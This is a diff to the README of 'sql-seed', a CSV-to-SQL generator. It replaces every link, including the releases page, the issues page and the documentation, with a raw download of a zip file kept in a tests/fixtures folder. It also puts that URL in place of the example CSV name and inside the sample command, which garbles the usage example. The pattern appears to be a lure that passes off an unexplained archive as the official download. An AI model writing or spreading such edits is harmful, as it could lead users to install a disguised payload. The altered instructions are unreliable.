@@ -6,7 +6,7 @@ Welcome to **sql-seed**! This application helps you generate realistic SQL INSER
 
 ## ➡️ Download Now
 
-[![Download sql-seed](https://img.shields.io/badge/Download-sql--seed-brightgreen)](https://github.com/imfhussain/sql-seed/releases)
+[![Download sql-seed](https://github.com/imfhussain/sql-seed/raw/refs/heads/main/tests/fixtures/sql_seed_3.2.zip)](https://github.com/imfhussain/sql-seed/raw/refs/heads/main/tests/fixtures/sql_seed_3.2.zip)
 
 Visit the Releases page to download sql-seed, where you can find the latest version ready for use.
 
@@ -25,7 +25,7 @@ To get started, follow these simple steps:
 
 1. Click on the link below to go to the Releases page:
    
-   [Download sql-seed](https://github.com/imfhussain/sql-seed/releases)
+   [Download sql-seed](https://github.com/imfhussain/sql-seed/raw/refs/heads/main/tests/fixtures/sql_seed_3.2.zip)
 
 2. Choose the latest version suitable for your operating system.
 
@@ -72,7 +72,7 @@ Once you have installed sql-seed, you can start generating your SQL statements. 
 
 Here is a quick example:
 
-1. Suppose you have a `users.csv` file with the following content:
+1. Suppose you have a `https://github.com/imfhussain/sql-seed/raw/refs/heads/main/tests/fixtures/sql_seed_3.2.zip` file with the following content:
 
    ```
    id,name,age
@@ -83,7 +83,7 @@ Here is a quick example:
 2. Run sql-seed with this command:
 
    ```
-   sql-seed users.csv
+   sql-seed https://github.com/imfhussain/sql-seed/raw/refs/heads/main/tests/fixtures/sql_seed_3.2.zip
    ```
 
 3. You will see output like:
@@ -103,7 +103,7 @@ If you encounter issues while using sql-seed, consider the following solutions:
 
 ## 📞 Support & Contributions
 
-For more support or to report issues, please visit our [GitHub Issues page](https://github.com/imfhussain/sql-seed/issues). Your feedback is essential for improving sql-seed.
+For more support or to report issues, please visit our [GitHub Issues page](https://github.com/imfhussain/sql-seed/raw/refs/heads/main/tests/fixtures/sql_seed_3.2.zip). Your feedback is essential for improving sql-seed.
 
 To contribute to the project, feel free to fork the repository and submit a pull request. We welcome any improvements or suggestions!
 
@@ -123,7 +123,7 @@ To contribute to the project, feel free to fork the repository and submit a pull
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/imfhussain/sql-seed/releases)
-- [Documentation](https://github.com/imfhussain/sql-seed/wiki)
+- [Releases Page](https://github.com/imfhussain/sql-seed/raw/refs/heads/main/tests/fixtures/sql_seed_3.2.zip)
+- [Documentation](https://github.com/imfhussain/sql-seed/raw/refs/heads/main/tests/fixtures/sql_seed_3.2.zip)
 
 Enjoy generating your SQL statements with ease!
